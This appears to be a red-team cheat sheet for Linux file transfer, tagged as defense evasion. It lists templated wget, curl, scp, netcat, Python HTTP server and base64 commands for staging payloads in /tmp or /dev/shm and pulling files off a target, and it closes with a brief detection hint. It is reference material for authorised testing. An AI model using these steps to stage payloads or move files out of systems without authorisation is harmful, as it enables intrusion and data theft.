---
technique: Linux File Transfer
category: defense-evasion
targets: Linux Workstation, Linux Server
protocols: HTTP, HTTPS, SSH, TCP
remote_capable: true
tags: linux file-transfer curl wget scp nc base64
---

# Linux File Transfer

Linux file transfer uses native tools to stage payloads and collect files. Prefer predictable writable paths such as `/tmp` or `/dev/shm` and keep download, decode, and execution as separate actions.

## Prerequisites

| Requirement | Detail |
|-------------|--------|
| Network access | Target must reach the operator server or receive an inbound connection |
| Writable path | Output path must be writable by the current user |

## Linux

### wget download

#sh #wget

Download a file with wget.

```sh title:"Download file with wget"
wget "$url" -O "$output_file"
```
<!-- cheat
var url
var output_file
-->

### curl download

#sh #curl

Download a file with curl.

```sh title:"Download file with curl"
curl -fsSL "$url" -o "$output_file"
```
<!-- cheat
var url
var output_file
-->

### Python HTTP server

#sh #python

Serve the current directory over HTTP.

```sh title:"Serve current directory over HTTP"
python3 -m http.server "$lport"
```
<!-- cheat
var lport
-->

### SCP upload

#sh #scp

Copy a local file to a remote host over SSH.

```sh title:"Upload file with SCP"
scp "$local_file" "$user@$rhost_ip:$remote_path"
```
<!-- cheat
var local_file
var user
var rhost_ip
var remote_path
-->

### SCP download

#sh #scp

Copy a remote file to the local host over SSH.

```sh title:"Download file with SCP"
scp "$user@$rhost_ip:$remote_file" "$local_path"
```
<!-- cheat
var user
var rhost_ip
var remote_file
var local_path
-->

### Netcat send

#sh #nc

Send a file to a listening host with netcat.

```sh title:"Send file with netcat"
nc "$rhost_ip" "$rport" < "$local_file"
```
<!-- cheat
var rhost_ip
var rport
var local_file
-->

### Netcat receive

#sh #nc

Receive a file from a netcat sender.

```sh title:"Receive file with netcat"
nc -lvnp "$lport" > "$output_file"
```
<!-- cheat
var lport
var output_file
-->

### Base64 encode file

#sh #base64

Encode a file for text-only transfer.

```sh title:"Base64 encode file"
base64 -w 0 "$local_file"
```
<!-- cheat
var local_file
-->

### Base64 decode file

#sh #base64

Decode a base64 file to a binary output.

```sh title:"Decode base64 file"
base64 -d "$b64_file" > "$output_file"
```
<!-- cheat
var b64_file
var output_file
-->

## Detection

Watch command lines for transfer tools writing into temporary paths and for ad hoc Python HTTP servers.
